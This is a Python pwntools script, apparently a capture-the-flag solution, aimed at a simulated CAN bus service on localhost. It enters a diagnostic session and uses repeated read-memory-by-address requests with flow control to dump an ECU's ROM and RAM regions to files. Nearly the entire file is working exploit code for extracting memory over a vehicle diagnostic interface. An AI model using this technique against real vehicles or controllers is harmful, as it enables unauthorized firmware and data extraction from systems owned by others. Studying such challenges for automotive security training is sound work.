#!/usr/bin/env python3
from rich import print
from pwn import remote, log
from sds import Msg, Request, MsgType
from rich.console import Console

console = Console()
io = remote('localhost', 5000)


mem_regions = {
    "rom": [0x60010000, 0x61000000],
    "protected": [0x61000000, 0x62000000],
    "ram": [0x70000000, 0x71000000]
}


def candump():
    """
    can0 7E0 [8] ab c1 23 00 00 00 00 00
    can0 7E8 [8] 03 7f c1 11 00 00 00 00
    """
    io.sendlineafter(b"> ", b"candump")
    msgs = []
    while (line := io.recvline().strip()) != b"":
        response = Msg.from_candump(line.decode())
        msgs.append(response)
    return msgs


def candump_clear():
    io.sendlineafter(b"> ", b"candump clear")


def cansend(request):
    io.sendlineafter(b"> ", f"cansend {request}".encode())


def dump_memory(address, size, p=None):
    candump_clear()
    data = []
    for i in range(0, size, 0xffff):
        if p is not None:
            p.status(f"Dumping {address + i:#x} {len(data):#x}/{size:#x}")
        cansend(Request.read_address(address + i, 0xffff))
        cansend(Request.flow_control_continue())
        end_len = min(size - len(data), 0xffff)
        round_data = []
        while len(round_data) < end_len:
            msgs = candump()
            for msg in msgs:
                frame = msg.frames[0]
                if frame.msg_type == MsgType.FlowControlFrame:
                    round_data.extend(frame.data_bytes[1:])
                elif frame.msg_type == MsgType.FlowControlIndicatorResponse:
                    round_data.extend(frame.data_bytes[2:])
        data.extend(round_data[:end_len])
        candump_clear()

    return bytes(data)
# def dump_memory(address, size, p=None):
#     candump_clear()
#     data = []
#     for i in range(0, size, 0xff):
#         if p is not None:
#             p.status(f"Dumping {address + i:#x}")
#         cansend(Request.read_address(address + i, 0xff))
#         cansend(Request.flow_control_continue())
#         end_len = min(size - len(data), 0xff)
#         round_data = []
#         while len(round_data) < end_len:
#             msgs = candump()
#             for msg in msgs:
#                 frame = msg.frames[0]
#                 if frame.msg_type == MsgType.FlowControlFrame:
#                     round_data.extend(frame.data_bytes[1:])
#                 elif frame.msg_type == MsgType.FlowControlIndicatorResponse:
#                     round_data.extend(frame.data_bytes[2:])
#         data.extend(round_data[:end_len])
#         candump_clear()
#
#     return bytes(data)


# io.sendlineafter(b"> ", b"cansend 7c0#0220010000000000")
cansend(Request.enter_diagnostic_session())
p = log.progress("Dumping Rom")
rom = dump_memory(mem_regions['rom'][0], 0x40000, p)
with open("rom.bin", "wb") as f:
    f.write(rom)
p.success("Rom dumped")
p = log.progress("Dumping Ram")
ram = dump_memory(mem_regions['ram'][0],
                  mem_regions['ram'][1] - mem_regions['ram'][0], p)

with open("ram.bin", "wb") as f:
    f.write(ram)
p.success("Ram dumped")
# cansend(Request.return_to_normal())
# for i in range(0x100):
#     if i > 0 and i % 0x10 == 0:
#         candump()
#         io.sendlineafter(b"> ", b"candump clear")
# cansend(Request.read_address(0x60010000, 0x40))
# cansend(Request.flow_control_continue())

io.interactive()
